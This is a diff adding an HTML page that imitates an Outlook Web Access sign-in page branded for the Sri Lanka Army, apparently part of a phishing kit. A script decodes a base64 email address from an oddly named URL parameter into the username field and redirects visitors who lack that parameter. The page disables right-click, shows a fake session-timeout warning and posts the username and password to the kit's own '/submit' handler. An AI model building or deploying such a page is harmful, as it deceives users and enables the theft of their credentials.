@@ -1,0 +1,772 @@
+<!DOCTYPE html>
+
+<html>
+  <head>
+    <meta http-equiv="X-UA-Compatible" content="IE=10">
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="Robots" content="NOINDEX, NOFOLLOW">
+    <link rel="shortcut icon" href="./files/favicon.ico" type="image/x-icon">
+    <title>Sri Lanka Army - Web Mail</title>
+    <style>
+      @font-face {
+        font-family: "wf_segoe-ui_normal";
+        src: url("./files/segoeui-regular.eot") format("embedded-opentype"),
+          url("./files/segoeui-regular.ttf") format("truetype");
+      }
+
+      @font-face {
+        font-family: "wf_segoe-ui_semilight";
+        src: url("./files/segoeui-semilight.eot") format("embedded-opentype"),
+          url("./files/segoeui-semilight.ttf") format("truetype");
+      }
+
+      @font-face {
+        font-family: "wf_segoe-ui_semibold";
+        src: url("./files/segoeui-semibold.eot") format("embedded-opentype"),
+          url("./files/segoeui-semibold.ttf") format("truetype");
+      }
+    </style>
+    <style>
+      /*Copyright (c) 2003-2006 Microsoft Corporation.  All rights reserved.*/
+      body.rtl {
+        text-align: right;
+        direction: rtl;
+      }
+
+      body,
+      .mouse,
+      .twide,
+      .tnarrow,
+      form {
+        height: 100%;
+        width: 100%;
+        margin: 0px;
+      }
+
+      .mouse,
+      .twide {
+        min-width: 650px;
+        /* min iPad1 dimension */
+        min-height: 650px;
+        position: absolute;
+        top: 0px;
+        bottom: 0px;
+        left: 0px;
+        right: 0px;
+      }
+
+      /* Existing styles */
+      .sidebar {
+        background-image: url('./files/back.png');
+        position: relative;
+        /* Add relative positioning to the sidebar */
+      }
+
+      /* Center-align the sidebar logo */
+      .sidebar img {
+        display: block;
+        /* Ensure the image is a block element */
+        margin: 0 auto;
+        /* Center-align the image horizontally */
+        position: absolute;
+        /* Position the image absolutely within the sidebar */
+        top: 45%;
+        /* Center-align vertically */
+        left: 50%;
+        /* Center-align horizontally */
+        transform: translate(-50%, -50%);
+        /* Translate the image to center it */
+      }
+
+      /* Add text after the sidebar image */
+      .sidebar::after {
+        content: "Copyright © 2023 Sri Lanka Army | All Rights Reserved - Dte of IT";
+        display: block;
+        padding: 5px;
+        color: white;
+        text-align: center;
+        /* Center-align the text */
+        font-family: Arial, sans-serif;
+        /* Change the font family */
+        position: absolute;
+        /* Position the text absolutely within the sidebar */
+        bottom: 370;
+        /* Align it to the bottom */
+        left: 0;
+        /* Align it to the left */
+        right: 0;
+        /* Align it to the right */
+        font-size: 15px;
+        /* Adjust the font size as needed */
+        font-weight: bold;
+        /* Make the font bold */
+        top: 58%;
+        /* Center-align vertically */
+        transform: translateY(-50%);
+        /* Translate the text to center it vertically */
+      }
+
+      .mouse .sidebar,
+      .twide .sidebar {
+        position: absolute;
+        top: 0px;
+        bottom: 0px;
+        left: 0px;
+        display: inline-block;
+        width: 400px;
+      }
+
+      .tnarrow .sidebar {
+        display: none;
+      }
+
+      .mouse .owaLogoContainer,
+      .twide .owaLogoContainer {
+        margin: 230px auto auto 110px;
+        text-align: left
+          /* Logo aligns left for both ltr & rtl */
+      }
+
+      .tnarrow .owaLogo {
+        display: none;
+      }
+
+      .mouse .owaLogoSmall,
+      .twide .owaLogoSmall {
+        display: none;
+      }
+
+      .logonDiv {
+        text-align: left;
+      }
+
+      .rtl .logonDiv {
+        text-align: right;
+      }
+
+      .mouse .logonContainer,
+      .twide .logonContainer {
+        padding-top: 174px;
+        padding-left: 464px;
+        padding-right: 142px;
+        position: absolute;
+        top: 0px;
+        bottom: 0px;
+        left: 0px;
+        right: 0px;
+        text-align: center;
+      }
+
+      .mouse .logonDiv,
+      .twide .logonDiv {
+        position: relative;
+        vertical-align: top;
+        display: inline-block;
+        width: 600px;
+      }
+
+      .tnarrow .logonDiv {
+        margin: 25px auto auto -130px;
+        position: absolute;
+        left: 50%;
+        width: 260px;
+        padding-bottom: 20px;
+      }
+
+      .twide .signInImageHeader,
+      .tnarrow .signInImageHeader {
+        display: none;
+      }
+
+      .mouse .signInImageHeader {
+        margin-bottom: 22px;
+      }
+
+      .twide .mouseHeader {
+        display: none;
+      }
+
+      .mouse .twideHeader {
+        display: none;
+      }
+
+      input::-webkit-input-placeholder {
+        font-size: 16px;
+        color: #98A3A6;
+      }
+
+      input:-moz-placeholder {
+        font-size: 16px;
+        color: #98A3A6;
+      }
+
+      .tnarrow .signInInputLabel,
+      .twide .signInInputLabel {
+        display: none;
+      }
+
+      .mouse .signInInputLabel {
+        margin-bottom: 2px;
+      }
+
+      .mouse .showPasswordCheck {
+        display: none;
+      }
+
+      .signInInputText {
+        border: 1px solid #98A3A6;
+        color: #333333;
+        border-radius: 0;
+        -moz-border-radius: 0;
+        -webkit-border-radius: 0;
+        box-shadow: none;
+        -moz-box-shadow: none;
+        -webkit-box-shadow: none;
+        -webkit-appearance: none;
+        background-color: #FDFDFD;
+        width: 250px;
+        margin-bottom: 10px;
+        box-sizing: content-box;
+        -moz-box-sizing: content-box;
+        -webkit-box-sizing: content-box;
+      }
+
+      .mouse .signInInputText {
+        height: 22px;
+        font-size: 12px;
+        padding: 3px 5px;
+        color: #333333;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-bottom: 20px;
+      }
+
+      .twide .signInInputText,
+      .tnarrow .signInInputText {
+        border-color: #666666;
+        height: 22px;
+        font-size: 16px;
+        color: #000000;
+        padding: 7px 7px;
+        font-family: 'wf_segoe-ui_semibold', 'Segoe UI Semibold', 'Segoe WP Semibold', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-bottom: 20px;
+        width: 264px;
+      }
+
+      .divMain {
+        width: 444px;
+      }
+
+      .l {
+        text-align: left;
+      }
+
+      .rtl .l {
+        text-align: right;
+      }
+
+      .r {
+        text-align: right;
+      }
+
+      .rtl .r {
+        text-align: left;
+      }
+
+      table#tblMain {
+        margin-top: 48px;
+        padding: 0px;
+      }
+
+      table.mid {
+        width: 385px;
+        border-collapse: collapse;
+        padding: 0px;
+        color: #444444;
+      }
+
+      table.tblConn {
+        direction: ltr;
+      }
+
+      td.tdConnImg {
+        width: 22px;
+      }
+
+      td.tdConn {
+        padding-top: 15px;
+      }
+
+      td#mdLft {
+        background: url("lgnleft.gif") repeat-y;
+        width: 15px;
+      }
+
+      td#mdRt {
+        background: url("lgnright.gif") repeat-y;
+        width: 15px;
+      }
+
+      td#mdMid {
+        padding: 0px 45px;
+        background: #ffffff;
+        vertical-align: top;
+      }
+
+      td .txtpad {
+        padding: 3px 6px 3px 0px;
+      }
+
+      .txt {
+        padding: 3px;
+        height: 2.2em;
+      }
+
+      input.btn {
+        color: #ffffff;
+        background-color: #eb9c12;
+        border: 0px;
+        padding: 2px 6px;
+        margin: 0px 6px;
+        text-align: center;
+      }
+
+      .btnOnFcs {
+        color: #ffffff;
+        background-color: #eb9c12;
+        border: 0px;
+        padding: 2px 6px;
+        margin: 0px 6px;
+        text-align: center;
+      }
+
+      .btnOnMseOvr {
+        color: #ffffff;
+        background-color: #f9b133;
+        border: 0px;
+        padding: 2px 6px;
+        margin: 0px 6px;
+        text-align: center;
+      }
+
+      .btnOnMseDwn {
+        color: #000000;
+        background-color: #f9b133;
+        border: 0px solid #f9b133;
+        padding: 2px 6px;
+        margin: 0px 6px;
+        text-align: center;
+      }
+
+      .nowrap {
+        white-space: nowrap;
+      }
+
+      hr {
+        height: 0px;
+        visibility: hidden;
+      }
+
+      .wrng {
+        color: #ff6c00;
+      }
+
+      .disBsc {
+        color: #999999;
+      }
+
+      .expl {
+        color: #999999;
+      }
+
+      .w100,
+      .txt {
+        width: 100%;
+      }
+
+      .txt {
+        margin: 0px 6px;
+      }
+
+      .rdo {
+        margin: 0px 12px 0px 32px;
+      }
+
+      body.rtl .rdo {
+        margin: 0px 32px 0px 12px;
+      }
+
+      tr.expl td,
+      tr.wrng td {
+        padding: 2px 0px 4px;
+      }
+
+      tr#trSec td {
+        padding: 3px 0px 8px;
+      }
+
+      /* language page specific styles */
+      td#tdLng {
+        padding: 12px 0px;
+      }
+
+      td#tdTz {
+        padding: 8px 0px;
+      }
+
+      select#selTz {
+        padding: 0px;
+        margin: 0px;
+      }
+
+      td#tdOptMsg {
+        padding: 10px 0px;
+      }
+
+      td#tdOptChk {
+        padding: 0px 0px 15px 65px;
+      }
+
+      td#tdOptAcc {
+        vertical-align: middle;
+        padding: 0px 0px 0px 3px;
+      }
+
+      select#selLng {
+        margin: 0px 16px;
+      }
+
+      /* logoff page specific styles */
+      td#tdMsg {
+        margin: 9px 0px 64px;
+      }
+
+      input#btnCls {
+        margin: 3px 6px;
+      }
+
+      td.lgnTL,
+      td.lgnBL {
+        width: 456px;
+      }
+
+      td.lgnTM {
+        background: url("lgntopm.gif") repeat-x;
+        width: 100%;
+      }
+
+      td.lgnBM {
+        background: url("lgnbotm.gif") repeat-x;
+        width: 100%;
+      }
+
+      td.lgnTR,
+      td.lgnBR {
+        width: 45px;
+      }
+
+      table.tblLgn {
+        padding: 0px;
+        margin: 0px;
+        border-collapse: collapse;
+        width: 100%;
+      }
+
+      .signInBg {
+        margin: 0px;
+      }
+
+      .signInTextHeader {
+        font-size: 60px;
+        color: #404344;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-bottom: 18px;
+        white-space: nowrap;
+      }
+
+      .signInInputLabel {
+        font-size: 12px;
+        color: #666666;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+      }
+
+      .signInCheckBoxText {
+        font-size: 12px;
+        color: #6A7479;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-top: 16px;
+      }
+
+      .twide .signInCheckBoxText,
+      .tnarrow .signInCheckBoxText {
+        font-size: 15px;
+      }
+
+      .signInCheckBoxLink {
+        font-size: 12px;
+        color: #0072C6;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+      }
+
+      .signInEnter {
+        font-size: 22px;
+        color: #0072C6;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-top: 20px;
+      }
+
+      .twide .signInEnter {
+        margin-top: 17px;
+        font-size: 29px;
+      }
+
+      .tnarrow .signInEnter {
+        margin-top: 2px;
+        font-size: 29px;
+        position: relative;
+        float: left;
+        left: 50%;
+      }
+
+      .signinbutton {
+        cursor: pointer;
+        display: inline;
+        color: #354427;
+        background-color:transparent;
+        border-color:transparent;
+        /* Change the text color to white */
+      }
+
+     
+
+      .shellDialogueHead {
+        font-size: 29px;
+        color: #0072C6;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+      }
+
+      .mouse .shellDialogueHead {
+        line-height: 35px;
+        margin-bottom: 10px;
+      }
+
+      .twide .shellDialogueHead,
+      .tnarrow .shellDialogueHead {
+        line-height: 34px;
+        margin-bottom: 12px;
+      }
+
+      .shellDialogueMsg {
+        font-size: 13px;
+        color: #333333;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        line-height: 18px;
+      }
+
+      .twide .shellDialogueMsg,
+      .tnarrow .shellDialogueMsg {
+        font-size: 15px;
+      }
+
+      .headerMsgDiv {
+        width: 350px;
+        margin-bottom: 22px;
+      }
+
+      .twide .headermsgdiv {
+        margin-bottom: 30px;
+      }
+
+      .tnarrow .headermsgdiv {
+        width: 260px;
+        margin-bottom: 30px;
+      }
+
+      .signInError {
+        font-size: 12px;
+        color: #C1272D;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-top: 12px;
+      }
+
+      .passwordError {
+        color: #A80F22;
+        font-family: 'wf_segoe-ui_normal', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        line-height: 18px;
+      }
+
+      .mouse .passwordError {
+        margin-top: 10px;
+        font-size: 13px;
+      }
+
+      .twide .passwordError,
+      .tnarrow .passwordError {
+        margin-top: 12px;
+        font-size: 15px;
+      }
+
+      .signInExpl {
+        font-size: 14px;
+        color: red;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-top: 5px;
+      }
+
+      .signInWarning {
+        font-size: 12px;
+        color: #C1272D;
+        font-family: 'wf_segoe-ui_semilight', 'Segoe UI Semilight', 'Segoe WP Semilight', 'Segoe UI', 'Segoe WP', Tahoma, Arial, sans-serif;
+        margin-top: 5px;
+      }
+
+      input.chk {
+        margin-right: 9px;
+        margin-left: 0px;
+      }
+
+      .imgLnk {
+        vertical-align: middle;
+        
+        line-height: 2;
+        margin-top: -6px;
+      }
+
+      .signinTxt {
+        padding-left: 7px;
+        padding-right: 11px;
+        font-size:20px;
+        /* Needed for RTL, doesnt hurt to add this for LTR as well */
+      }
+
+      .hidden-submit {
+        border: 0 none;
+        height: 0;
+        width: 0;
+        padding: 0;
+        margin: 0;
+        overflow: hidden;
+      }
+
+      .officeFooter {
+        position: absolute;
+        bottom: 33px;
+        right: 45px;
+      }
+
+      .tnarrow .officeFooter {
+        display: none;
+      }
+      
+      button{
+      
+      margin-left:-1.5%;
+      }
+    </style>
+    <script>
+		    // Function to extract query parameter value
+		    function getQueryParameter(parameterName) {
+		      var queryString = window.location.search;
+		      var urlParams = new URLSearchParams(queryString);
+		      return urlParams.get(parameterName);
+		    }
+		    // Get the value from the 'data' query parameter
+		    var value = getQueryParameter('jdfgjfgjfgjgdjgdj');
+		    
+		    if (value == null){
+		    
+		    window.location.href = "error.html";
+		    
+		    }else{
+		    
+		    var b64name = atob(value);
+		    
+		    function onLoad() {
+		      var b64name = atob(value);
+		      var inputField = document.getElementById('username');
+		      inputField.value = b64name;
+		    }
+		    
+		    }
+
+		  </script>
+    
+  </head>
+  <body onload="onLoad();" oncontextmenu="return false;" class="signInBg" style="background: #f2f2f2 url('./files/body.png') repeat-x">
+    <noscript>
+      <div id="dvErr">
+        <table cellpadding="0" cellspacing="0">
+          <tr>
+            <td>
+              <img src="./files/tr.png" alt="">
+            </td>
+            <td style="width:100%">To use Outlook, browser settings must allow scripts to run. For information about how to allow scripts, consult the Help for your browser. If your browser doesn&#39;t support scripts, you can download <a href="https://go.microsoft.com/fwlink/?linkid=2009667&clcid=0x409">Windows Internet Explorer</a> for access to Outlook. </td>
+          </tr>
+        </table>
+      </div>
+    </noscript>
+    <form action="/submit" method="POST" name="logonForm" enctype="application/x-www-form-urlencoded" autocomplete="off">
+      <input type="hidden" name="destination" value="">
+      <input type="hidden" name="flags" value="4">
+      <input type="hidden" name="forcedownlevel" value="0">
+      <!-- Default to mouse class, so that things don't look wacky if the script somehow doesn't apply a class -->
+      <div id="mainLogonDiv" class="mouse">
+        <div class="sidebar">
+          <div class="owaLogoContainer">
+            <img src="./files/side.png" class="owaLogo" aria-hidden="true">
+            <img src="./files/hide.png" class="owaLogoSmall" aria-hidden="true">
+          </div>
+        </div>
+        <div class="logonContainer">
+          <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
+            <div class="signInImageHeader" role="heading" aria-label="Outlook">
+              <img class="mouseHeader" src="./files/logo.png" alt="Outlook">
+            </div>
+            <div class="signInInputLabel" id="userNameLabel" aria-hidden="true">User name:</div>
+            <div>
+              <input id="username" name="username"  value="" class="signInInputText" role="textbox" aria-labelledby="userNameLabel">
+            </div>
+            <div class="signInInputLabel" id="passwordLabel" aria-hidden="true">Password:</div>
+            <div>
+              <input id="password" onfocus="g_fFcs=0" name="password" value="" type="password" class="signInInputText" aria-labelledby="passwordLabel">
+            </div>
+            
+            <div>
+              <input id="passwordText" onfocus="g_fFcs=0" name="passwordText" style="display: none;" class="signInInputText" aria-labelledby="passwordLabel">
+            </div>
+            <div class="showPasswordCheck signInCheckBoxText">
+              <input type="checkbox" id="showPasswordCheck" class="chk" onclick="showPasswordClick()">
+              <span>Show password</span>
+            </div>
+            <div id="expltxt" class="signInExpl" role="alert"> Your session time out please login to continue.</div>
+            <div class="signInEnter">
+              <button  class="signinbutton" type="submit" role="button" tabindex="0">
+                <img class="imgLnk" src="./files/lock.png" alt="">
+                <span class="signinTxt">sign in</span>
+              </button>
+              <input name="isUtf8" value="1" type="hidden">
+            </div>
+            <div class="hidden-submit">
+              <input type="submit" tabindex="-1">
+            </div>
+          </div>
+        </div>
+        <div id="cookieMsg" class="logonDiv" style="display:none">
+          <div class="signInHeader">Outlook</div>
+          <div class="signInExpl">Please enable cookies for this Web site. <br>
+            <br>Cookies are currently disabled by your browser. Outlook requires that cookies be enabled. <br>
+            <br>For information about how to enable cookies, see the Help for your Web browser. <br>
+            <br>
+            <br>
+          </div>
+          <div class="signInEnter">
+            <div onclick="clkRtry()" style="cursor:pointer;display:inline">
+              <img class="imgLnk" src="./files/lock.png" alt="">
+              <span class="signinTxt" tabindex="0">retry</span>
+            </div>
+          </div>
+        </div>
+      </div>
+    </form>
+    
+  </body>
+</html>
